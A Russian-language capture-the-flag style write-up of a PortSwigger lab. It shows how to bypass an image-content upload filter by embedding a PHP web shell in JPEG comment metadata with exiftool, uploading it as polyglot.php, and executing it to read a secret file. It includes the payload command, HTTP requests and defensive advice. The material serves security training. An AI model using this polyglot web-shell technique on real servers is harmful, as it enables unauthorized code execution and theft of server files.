# 📘 PortSwigger Lab: Web shell upload via content type restriction bypass

<a id="top"></a>

> 🔗 Лабораторная работа: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass  
> 🎯 Тема: Unrestricted File Upload — обход проверки содержимого через polyglot-файл (PHP/JPEG)  
> 🧪 Уровень: Practitioner  
> ✅ Статус: Solved  
> 🛠 Инструменты: Burp Suite, exiftool 13.55, file

---

## 📑 Содержание

- [🎯 Цель](#goal)
- [🧠 Краткая теория](#theory)
- [🧩 Ключевая идея](#idea)
- [🔬 Почему polyglot работает](#polyglot)
- [🐚 Веб-шелл](#webshell)
- [⚡ Пейлоад эксплойта](#exploit)
- [🔍 Шаг 1 — Разведка функции загрузки](#step1)
- [🔍 Шаг 2 — Проверка исходного изображения](#step2)
- [🔍 Шаг 3 — Эксперимент с метаданными](#step3)
- [🔍 Шаг 4 — Создание polyglot через exiftool](#step4)
- [🔍 Шаг 5 — Проверка polyglot](#step5)
- [🔍 Шаг 6 — Загрузка и извлечение секрета](#step6)
- [📨 Примеры запросов](#requests)
- [📥 Пример результата](#response)
- [🧾 Полная цепочка атаки](#attack-chain)
- [🔬 Почему атака сработала](#breakdown)
- [🧠 Как думать как пентестер](#pentester)
- [❌ Типичные ошибки](#mistakes)
- [🛡 Защита](#defense)
- [✅ Чек-лист](#checklist)
- [🧾 Итог](#conclusion)

---

<a id="goal"></a>

## 🎯 Цель

Обойти проверку содержимого загружаемого файла: сервер принимает только настоящие изображения. Нужно:

```text
1. Создать PHP/JPEG polyglot — файл, одновременно являющийся
   корректным JPEG и содержащий исполняемый PHP-код.
2. Загрузить его как аватар, пройдя валидацию содержимого.
3. Выполнить код через GET к загруженному файлу.
4. Прочитать /home/carlos/secret и отправить его как решение.
```

Учётные данные тестового пользователя:

```text
wiener:peter
```

---

<a id="theory"></a>

## 🧠 Краткая теория

Более сильная защита, чем blacklist расширений, — проверка содержимого: сервер убеждается, что файл является настоящим изображением (по magic bytes / структуре JPEG или PNG).

Свойства такой проверки:

```text
+ Блокирует простой переименовательный обход (shell.php.jpg)
+ Блокирует загрузку текстовых PHP-файлов с подменой Content-Type
− НЕ проверяет ВСЁ содержимое файла
− JPEG имеет избыточную структуру: метаданные (COM-сегмент)
  могут содержать произвольный текст без нарушения формата
```

**Polyglot-файл** — файл, валидный одновременно в двух форматах. JPEG переносит комментарий в COM-сегменте; PHP-интерпретатор исполняет текст между `<?php` и `?>` независимо от остального содержимого. Файл остаётся корректным изображением — и одновременно работает как PHP-шелл.

---

<a id="idea"></a>

## 🧩 Ключевая идея

Два парсера читают один файл:

```text
Проверка содержимого (image-валидатор):  FF D8 ... JPEG-структура с COM-сегментом
                                         → "это настоящий JPEG" → пропуск ✅

PHP-интерпретатор (Apache + mod_php):    сканирует байты, находит <?php ... ?>
                                         → исполняет код в COM-сегменте
```

Расширение `.php` нужно для того, чтобы Apache передал файл PHP-обработчику; а валидатор смотрит только на содержимое — и оно легитимно.

---

<a id="polyglot"></a>

## 🔬 Почему polyglot работает

### Метаданные JPEG не проверяются на «опасность»

Вывод эксперимента из разведки:

```text
exiftool -Comment="Hello from metadata" test.jpg
file test.jpg
→ test.jpg: JPEG image data, ..., comment: "Hello from metadata",
  baseline, precision 8, 200x200, components 3
```

Добавление текста в `Comment` не разрушает JPEG-структуру. Замена «Hello from metadata» на PHP-код меняет только содержимое COM-сегмента — формат остаётся валидным.

### PHP и бинарные данные совместимы

PHP-интерпретатор выводит всё вне тегов `<?php ... ?>` как есть и исполняет только содержимое тегов. Поэтому валидный JPEG с PHP-кодом в метаданных исполняется без ошибок: бинарные байты просто печатаются, а код в `<?php ... ?>` выполняется.

---

<a id="webshell"></a>

## 🐚 Веб-шелл

PHP-код, встраиваемый в метаданные, с маркерами для поиска результата среди бинарного вывода:

```php
<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>
```

Разбор:

```text
echo        — выводит результат
'START '    — маркер начала (чтобы найти секрет в бинарных данных)
.           — конкатенация строк
file_get_contents('/home/carlos/secret') — читает целевой файл
' END'      — маркер конца
```

Вывод при исполнении:

```text
START СЕКРЕТ_ЛАБОРАТОРИИ END
```

---

<a id="exploit"></a>

## ⚡ Пейлоад эксплойта

Команда создания polyglot:

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" images.jpg -o polyglot.php
```

Разбор параметров:

```text
-Comment="..."   — записать PHP-код в метаданные JPEG (COM-сегмент)
images.jpg       — исходный корректный JPEG (не изменённый test.jpg —
                   чтобы метаданные были чистыми и содержали только наш код)
-o polyglot.php  — имя выходного файла (именно -o задаёт его,
                   поэтому файл создаётся сразу с расширением .php)
```

Кавычки: внешние двойные — для shell, одинарные внутри — часть PHP-кода.

---

<a id="step1"></a>

## 🔍 Шаг 1 — Разведка функции загрузки

1. Авторизоваться под `wiener:peter`.
2. Попытаться загрузить `exploit.php` с классическим шеллом. Ответ:

```text
You can only upload JPG and PNG files.
```

3. Попытаться загрузить `exploit.php` с подменённым `Content-Type: image/jpeg` (как в предыдущей лабе). Ответ — та же ошибка.

Вывод: фильтр здесь проверяет **содержимое файла**, а не заголовки запроса.

---

<a id="step2"></a>

## 🔍 Шаг 2 — Проверка исходного изображения

Подготовить настоящий JPEG и исследовать его:

```bash
file images.jpg
exiftool images.jpg
```

Вывод exiftool:

```text
File Type                       : JPEG
MIME Type                       : image/jpeg
Image Width                     : 200
Image Height                    : 200
Encoding Process                : Baseline DCT, Huffman coding
Image Size                      : 200x200
```

Проверка поля Comment:

```bash
exiftool -Comment images.jpg
```

Поле отсутствует — файл чистый, готов к экспериментам.

---

<a id="step3"></a>

## 🔍 Шаг 3 — Эксперимент с метаданными

Контрольный эксперимент: изменить метаданные и убедиться, что JPEG остаётся JPEG.

```bash
cp images.jpg test.jpg
exiftool -Comment="Hello from metadata" test.jpg
exiftool -Comment test.jpg
file test.jpg
```

Вывод:

```text
Comment                         : Hello from metadata

test.jpg: JPEG image data, JFIF standard 1.01, ..., comment:
"Hello from metadata", baseline, precision 8, 200x200, components 3
```

Вывод эксперимента:

```text
Комментарий добавлен        → поле Comment появилось в метаданных
Формат не разрушен          → file по-прежнему определяет JPEG
Структура изображения целая → 200x200, baseline, components 3
```

Именно на этом основана идея polyglot: текст в метаданных совместим с форматом.

---

<a id="step4"></a>

## 🔍 Шаг 4 — Создание polyglot через exiftool

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" images.jpg -o polyglot.php
```

Ответ:

```text
1 image files created
```

---

<a id="step5"></a>

## 🔍 Шаг 5 — Проверка polyglot

```bash
file polyglot.php
exiftool -Comment polyglot.php
```

Вывод:

```text
polyglot.php: JPEG image data, JFIF standard 1.01, ..., comment:
"<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>",
baseline, precision 8, 200x200, components 3

Comment                         : <?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>
```

Обе проверки пройдены:

```text
[✓] Файл распознаётся как JPEG, несмотря на расширение .php
[✓] Поле Comment содержит PHP-код с маркерами START и END
```

---

<a id="step6"></a>

## 🔍 Шаг 6 — Загрузка и извлечение секрета

1. Загрузить `polyglot.php` как аватар через форму My Account — сервер принимает файл (проверка содержимого пройдена).
2. В Burp → Proxy → HTTP history найти запрос раздачи аватара:

```http
GET /files/avatars/polyglot.php
```

и отправить в Repeater (если запрос не виден — обновить страницу аккаунта, проверить фильтр MIME Images, или взять запрос из Target → Site map).

3. Отправить запрос. В ответе — бинарные байты изображения и исполненный PHP-код.
4. Найти маркер `START` поиском в ответе. Между маркерами — секрет:

```text
START SECRET-VALUE-HERE END
```

5. Отправить секрет через кнопку в баннере лабы → Solved.

---

<a id="requests"></a>

## 📨 Примеры запросов

### Блокированная загрузка (эталон)

```http
POST /my-account/avatar HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: multipart/form-data; boundary=------WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundary
...
```

Ответ:

```text
You can only upload JPG and PNG files.
```

### Рабочая загрузка polyglot

```http
POST /my-account/avatar HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: multipart/form-data; boundary=------WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="avatar"; filename="polyglot.php"
Content-Type: image/jpeg

FFD8FFE0 ... [JPEG: SOI, JFIF, COM-сегмент с PHP-кодом, скан изображения] ... FFD9
------WebKitFormBoundary
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundary
Content-Disposition: form-data; name="csrf"

YOUR-CSRF-TOKEN
------WebKitFormBoundary--
```

Загрузка принята — файл является настоящим JPEG.

### Запрос к polyglot

```http
GET /files/avatars/polyglot.php HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
```

---

<a id="response"></a>

## 📥 Пример результата

### Ответ запроса к polyglot (фрагмент)

```http
HTTP/2 200 OK
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8

ÿØÿà [бинарные байты JPEG] START SECRET-VALUE-HERE END [бинарные байты JPEG]
```

Статус лаборатории:

```text
Solved
```

---

<a id="attack-chain"></a>

## 🧾 Полная цепочка атаки

```text
1. Авторизоваться под wiener:peter
2. Картировать фильтр: простой .php и подмена Content-Type блокируются
3. Подготовить настоящий JPEG (200x200), проверить через file/exiftool
4. Эксперимент: Comment добавляется без разрушения JPEG-структуры
5. Создать polyglot: exiftool -Comment="PHP-код" images.jpg -o polyglot.php
6. Проверить: file определяет JPEG, Comment содержит PHP
7. Загрузить polyglot.php как аватар → сервер принял (валидация содержимого пройдена)
8. GET /files/avatars/polyglot.php → найти START ... END в ответе
9. Секрет получен и отправлен — лаба Solved
```

---

<a id="breakdown"></a>

## 🔬 Почему атака сработала

### 1. Проверка содержимого имеет слепую зону

Валидатор убеждается, что файл — корректный JPEG, но не анализирует содержимое метаданных. COM-сегмент — легитимное место для произвольного текста.

### 2. JPEG избыточен

Формат переносит посторонние данные без нарушения структуры. Изображение открывается, рендерится, проходит все проверки — и одновременно несёт PHP-код.

### 3. Расширение .php включает исполнение

Сервер проверяет содержимое, но определяет обработчик по расширению. `.php` → mod_php → PHP-интерпретатор сканирует весь файл и исполняет код в тегах.

### 4. Два парсера, разные прочтения

```text
Image-валидатор:  «валидный JPEG»     → пропуск
PHP-интерпретатор: «код после <?php»   → исполнение
```

Тот же принцип расхождения парсеров, что и в предыдущих лабах, но на уровне содержимого файла, а не имени.

### 5. Маркеры START/END решают проблему бинарного вывода

Секрет окружён бинарными байтами JPEG — искать его глазами в ответе сложно. Маркеры делают результат findable поиском по строке.

---

<a id="pentester"></a>

## 🧠 Как думать как пентестер

При фильтре содержимого:

```text
1. Картировать: блокирует ли сервер подмену Content-Type? (эта лаба — да)
2. Изучить формат: есть ли в JPEG/PNG избыточные поля для данных
   (COM-сегмент JPEG, tEXt-чанки PNG)?
3. Проверить: принимает ли сервер изображение с данными в этих полях?
4. Объединить: полиглот = валидный формат + исполняемый код
5. Найти вывод: маркеры вокруг результата, поиск в бинарном ответе
6. Включить исполнение: расширение, которое сервер передаёт нужному обработчику
```

Ключевой вопрос всегда один: **что именно проверяет сервер — и что он не проверяет?**

---

<a id="mistakes"></a>

## ❌ Типичные ошибки

### Ошибка 1. Использовать изменённый test.jpg вместо чистого images.jpg

`test.jpg` уже содержит посторонний комментарий. Для polyglot использовать исходный `images.jpg`, чтобы метаданные содержали только PHP-код.

### Ошибка 2. Перепутать -Comment и -o

`-Comment` — параметр записи метаданных, `-o` — имя выходного файла. Без `-o` exiftool изменит файл на месте (и создаст резервную копию `_original`).

### Ошибка 3. Сломать кавычки в команде

Внешние двойные кавычки — для shell, одинарные внутри — часть PHP-кода:

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents(...) . ' END'; ?>" images.jpg -o polyglot.php
```

Двойные кавычки внутри двойных сломают команду.

### Ошибка 4. Не проверить polyglot перед загрузкой

Всегда проверять `file polyglot.php` + `exiftool -Comment polyglot.php` перед отправкой на сервер — так ошибка локализуется локально, а не на лаборатории.

### Ошибка 5. Искать секрет глазами в бинарном ответе

Ответ содержит тысячи бинарных байтов. Без маркеров START/END найти секрет практически невозможно — это не «украшательство», а необходимый элемент пейлоада.

### Ошибка 6. Пропустить, что расширение .php обязательно

Polyglot без `.php` сохранится, но Apache не передаст его PHP-обработчику — файл будет отдан как бинарник. Содержимое проходит валидацию, а исполнение включает расширение.

---

<a id="defense"></a>

## 🛡 Защита

### 1. Не полагаться только на валидацию содержимого

Валидный JPEG может нести произвольные данные в метаданных — проверка формата не проверяет безопасность содержимого.

### 2. Определять обработчик не по имени пользователя

Генерировать имя файла на сервере (UUID), не сохранять пользовательские расширения.

### 3. Переобрабатывать изображение

Декодировать загруженное изображение и перекодировать заново (ImageMagick/Pillow) — метаданные с посторонним кодом будут отброшены, останется только пиксельная карта.

### 4. Стричь метаданные

Удалять EXIF/COM-сегменты после загрузки, если они не нужны.

### 5. Хранение вне веб-корня и запрет исполнения

Загруженные файлы не должны исполняться никаким интерпретатором, даже если имя совпадает с исполняемым расширением.

### 6. Сервировать с правильным Content-Type

Отдавать файлы из директории загрузок с фиксированным `Content-Type: image/jpeg` и заголовком `Content-Disposition: attachment`.

---

<a id="checklist"></a>

## ✅ Чек-лист

### Разведка

- [ ] Авторизован под wiener:peter
- [ ] Простой `exploit.php` заблокирован
- [ ] Подмена Content-Type заблокирована → вывод: проверяется содержимое

### Подготовка

- [ ] Найден настоящий JPEG, проверен через file/exiftool
- [ ] Контрольный эксперимент: Comment добавляется, JPEG остаётся JPEG
- [ ] Polyglot создан командой exiftool с -o polyglot.php
- [ ] file polyglot.php → JPEG, exiftool → PHP-код в Comment

### Эксплуатация

- [ ] polyglot.php принят сервером как аватар
- [ ] GET /files/avatars/polyglot.php найден и отправлен в Repeater
- [ ] Найден маркер START, между маркерами — секрет
- [ ] Секрет отправлен
- [ ] Статус лабы: Solved

---

<a id="conclusion"></a>

## 🧾 Итог

Лаборатория решена через **PHP/JPEG polyglot**:

```text
1. Валидация содержимого проверяет только структуру JPEG — метаданные не анализируются
2. exiftool записывает PHP-код в COM-сегмент, JPEG остаётся валидным
3. Файл с расширением .php принят и передан PHP-обработчику
4. Код исполнен при обращении к файлу, секрет найден между маркерами START/END
```

Главные выводы:

```text
Проверка формата ≠ проверка безопасности содержимого: валидный JPEG может нести код.
```

```text
Polyglot использует избыточность формата: изображение и исполняемый код совместимы в одном файле.
```

```text
Маркеры START/END — практический приём для извлечения результата из бинарного вывода.
```

```text
Защита: переобработка изображений, стрижка метаданных, серверные имена, запрет исполнения.
```

---

[⬆ Вернуться к началу](#top)
